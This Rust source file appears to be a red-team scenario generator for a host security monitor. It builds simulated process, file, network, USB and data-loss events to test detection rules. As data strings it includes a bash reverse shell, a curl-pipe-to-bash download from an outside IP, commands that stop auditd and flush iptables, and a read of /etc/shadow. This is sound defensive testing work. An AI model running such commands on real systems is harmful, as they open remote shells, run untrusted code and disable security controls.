//! Attack-scenario generator. This is a red-team test harness (not a stub for core
//! functionality): it injects realistic malicious + benign telemetry so the full
//! Monitor → Detect → Prevent → Respond pipeline can be exercised end-to-end on any host,
//! including hosts without a live attacker. Real collectors run alongside it.

use rand::Rng;
use std::collections::BTreeMap;

use crate::collectors::categorize_domain;
use crate::event::{AuthInfo, DlpInfo, Event, FileInfo, NetInfo, Process, UsbInfo};

/// Produce one wave of events: a multi-stage intrusion plus benign noise.
pub fn generate_wave() -> Vec<Event> {
    let mut rng = rand::thread_rng();
    let mut out = Vec::new();
    let users = ["alice", "bob", "carol", "deploy"];
    let user = users[rng.gen_range(0..users.len())];
    let pid = rng.gen_range(2000..60000);

    // --- benign baseline noise ---
    for (name, cmd) in [
        ("vim", "vim /home/notes.txt"),
        ("ls", "ls -la /var/log"),
        ("git", "git pull origin main"),
        ("python3", "python3 manage.py runserver"),
    ] {
        out.push(proc_event(
            user,
            pid + out.len() as i64,
            "systemd",
            name,
            cmd,
            "info",
        ));
    }

    // --- Execution: reverse shell (critical, auto kill_process) ---
    out.push(proc_event(
        user,
        pid,
        "bash",
        "bash",
        "bash -i >& /dev/tcp/185.220.101.45/4444 0>&1",
        "critical",
    ));

    // --- Execution: download & run ---
    out.push(proc_event(
        user,
        pid + 1,
        "bash",
        "bash",
        "curl -s http://185.220.101.45/x.sh | bash",
        "high",
    ));

    // --- Initial access via web shell: nginx spawns bash ---
    out.push(proc_event(
        "www-data",
        pid + 2,
        "nginx",
        "bash",
        "sh -c 'id; uname -a'",
        "high",
    ));

    // --- Defense evasion ---
    out.push(proc_event(
        "root",
        pid + 3,
        "bash",
        "bash",
        "systemctl stop auditd",
        "high",
    ));
    out.push(proc_event(
        "root",
        pid + 4,
        "bash",
        "bash",
        "iptables -F",
        "high",
    ));

    // --- Persistence: cron + authorized_keys + systemd ---
    out.push(file_event("root", "/etc/cron.d/sysupdate", "create"));
    out.push(file_event(
        user,
        &format!("/home/{user}/.ssh/authorized_keys"),
        "write",
    ));
    out.push(file_event(
        "root",
        "/etc/systemd/system/evil.service",
        "create",
    ));

    // --- Credential access ---
    out.push(file_event("root", "/etc/shadow", "read"));

    // --- Command & control: cryptominer + anonymizer ---
    out.push(net_event(user, "pool.minexmr.com", "outbound", 4096, 8192));
    out.push(net_event(user, "exfilnode.onion", "outbound", 2048, 1024));

    // --- Credential access: brute force burst (behavioral) ---
    let attacker_ip = format!("203.0.113.{}", rng.gen_range(2..250));
    for _ in 0..6 {
        out.push(failed_login("root", &attacker_ip));
    }

    // --- Exfiltration: large outbound to cloud (rule + behavioral volume) ---
    out.push(net_event(
        user,
        "drive.google.com",
        "outbound",
        60 * 1024 * 1024,
        4096,
    ));

    // --- DLP: secrets to USB (block) + mass copy (behavioral) ---
    out.push(usb_event("Kingston", "DataTraveler", "USB-SN-4471"));
    out.push(dlp_event(
        user,
        "secret_aws",
        "usb",
        "AK****************LE",
        "AWS access key copied to USB",
    ));
    out.push(dlp_event(
        user,
        "pci_card",
        "usb",
        "41**********11",
        "Payment card data copied to USB",
    ));
    for i in 0..11 {
        out.push(usb_file_copy(user, &format!("/media/usb0/export_{i}.csv")));
    }

    // --- Internet monitoring: assorted browsing ---
    for dom in [
        "mail.google.com",
        "dropbox.com",
        "github.com",
        "facebook.com",
    ] {
        out.push(net_event(
            user,
            dom,
            "outbound",
            rng.gen_range(1000..50000),
            rng.gen_range(1000..900000),
        ));
    }

    out
}

fn proc_event(user: &str, pid: i64, parent: &str, name: &str, cmd: &str, sev: &str) -> Event {
    let mut ev = Event::new("process", "exec", sev)
        .with_user(user)
        .msg(format!("{name} executed: {cmd}"));
    ev.process = Some(Process {
        pid,
        ppid: 1,
        name: name.into(),
        exe: format!("/usr/bin/{name}"),
        cmdline: cmd.into(),
        uid: 0,
        user: user.into(),
        parent: parent.into(),
        lineage: format!("{parent}→{name}"),
        container: String::new(),
    });
    ev
}

fn file_event(user: &str, path: &str, op: &str) -> Event {
    let mut ev = Event::new("file", &format!("file_{op}"), "medium")
        .with_user(user)
        .msg(format!("{op} {path}"));
    ev.file = Some(FileInfo {
        path: path.into(),
        op: op.into(),
        size: 1024,
        ..Default::default()
    });
    ev
}

fn net_event(user: &str, domain: &str, dir: &str, out_b: i64, in_b: i64) -> Event {
    let mut ev = Event::new("network", "connect", "info")
        .with_user(user)
        .msg(format!("{dir} {domain}"));
    ev.network = Some(NetInfo {
        direction: dir.into(),
        proto: "https".into(),
        remote: format!("{domain}:443"),
        domain: domain.into(),
        url: format!("https://{domain}/"),
        category: categorize_domain(domain).into(),
        bytes_out: out_b,
        bytes_in: in_b,
        blocked: false,
        local_addr: String::new(),
    });
    ev
}

fn failed_login(user: &str, ip: &str) -> Event {
    let mut ev = Event::new("ssh", "auth_fail", "low")
        .with_user(user)
        .msg(format!("failed password for {user} from {ip}"));
    ev.auth = Some(AuthInfo {
        method: "password".into(),
        source_ip: ip.into(),
        tty: "ssh".into(),
        result: "failure".into(),
    });
    ev
}

fn usb_event(vendor: &str, product: &str, serial: &str) -> Event {
    let mut ev =
        Event::new("usb", "insert", "medium").msg(format!("USB connected: {vendor} {product}"));
    ev.usb = Some(UsbInfo {
        action: "insert".into(),
        vendor: vendor.into(),
        product: product.into(),
        serial: serial.into(),
        mount: "/media/usb0".into(),
        size_gb: 32,
    });
    ev
}

fn usb_file_copy(user: &str, path: &str) -> Event {
    let mut ev = Event::new("file", "file_write", "info")
        .with_user(user)
        .msg(format!("write {path}"));
    ev.file = Some(FileInfo {
        path: path.into(),
        op: "write".into(),
        size: 2_000_000,
        ..Default::default()
    });
    ev.usb = Some(UsbInfo {
        serial: "USB-SN-4471".into(),
        mount: "/media/usb0".into(),
        ..Default::default()
    });
    ev
}

fn dlp_event(user: &str, classifier: &str, channel: &str, sample: &str, msg: &str) -> Event {
    let sev = match classifier {
        "secret_aws" | "secret_privkey" => "critical",
        _ => "high",
    };
    let mut ev = Event::new("dlp", "content_match", sev)
        .with_user(user)
        .msg(msg);
    ev.dlp = Some(DlpInfo {
        classifier: classifier.into(),
        channel: channel.into(),
        matches: 1,
        sample: sample.into(),
        policy: "default".into(),
        verdict: String::new(), // server policy decides verdict
    });
    let mut extra = BTreeMap::new();
    extra.insert("scenario".into(), serde_json::Value::Bool(true));
    ev.extra = extra;
    ev
}
